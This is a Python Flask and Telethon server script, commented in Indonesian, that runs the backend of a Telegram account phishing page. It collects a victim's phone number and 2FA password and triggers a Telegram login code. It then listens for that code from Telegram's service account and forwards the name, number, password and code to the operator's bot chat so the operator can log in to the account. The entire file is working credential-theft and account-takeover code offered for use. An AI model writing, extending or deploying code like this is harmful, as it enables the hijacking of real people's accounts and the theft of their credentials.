import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Memori sementara untuk menyimpan data sesi target
user_db = {}

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    elif num.startswith('8'): num = '62' + num
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(handle_flow(data))

async def handle_flow(data):
    client = None
    try:
        step = data.get('step')
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')

        # Ambil session jika sudah ada
        session_str = user_db.get(nomor, {}).get('session', '')
        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
        await client.connect()

        # STEP 1 & 2: Target isi data di browser -> Kirim ke Bot
        if step == 1:
            # Pancingan awal HANYA untuk mendapatkan Sesi akses (Session String)
            res = await client.send_code_request(nomor)
            user_db[nomor] = {
                "session": client.session.save(), 
                "hash": res.phone_code_hash, 
                "nama": nama, 
                "msg_id": None,
                "sandi": "None"
            }
            
            # Kirim format sesuai permintaan Abang (OTP: None)
            text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : None"
            msg = bot_api("sendMessage", {
                "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
            })
            user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
            return jsonify({"status": "success"}), 200

        # Simpan Kata Sandi jika target mengisi di browser
        elif step == 3:
            user_db[nomor]['sandi'] = data.get('sandi', 'None')
            text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
            bot_api("editMessageText", {
                "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'],
                "text": text, "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
            })
            return jsonify({"status": "success"}), 200
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        
        # STEP 4: Klik tombol OTP -> Muncul teks "Bot siap"
        if action == "upd":
            if user_db.get(nomor, {}).get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
            
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID, "text": "Bot siap menerima OTP!\n/exit untuk keluar", 
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
            
            # STEP 5: Jalankan pemantau pesan masuk di latar belakang (Background)
            threading.Thread(target=lambda: asyncio.run(monitor_incoming_only(nomor))).start()
            
        elif action == "exit":
            if user_db.get(nomor, {}).get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
                user_db[nomor]['status_id'] = None
    return jsonify({"status": "success"})

async def monitor_incoming_only(nomor):
    data = user_db.get(nomor)
    if not data or not data.get('session'): return
    
    # Gunakan sesi yang didapat dari pancingan Step 1
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    
    try:
        # STEP 6: Mendengarkan (Listen) pesan masuk dari Telegram (777000)
        # Ini akan menangkap kode yang dikirim saat Abang login manual di TurboTel
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # Update OTP di pesan utama Step 1
                bot_api("editMessageText", {
                    "chat_id": CHAT_ID, "message_id": data['msg_id'],
                    "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                    "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                
                # STEP 7: Hapus teks "Bot siap" secara otomatis
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                    data['status_id'] = None
                
                # Selesai, matikan pemantauan untuk nomor ini
                await client.disconnect()
        
        # Bot Standby selama 5 menit untuk menunggu Abang login di TurboTel
        await asyncio.sleep(300)
    finally:
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))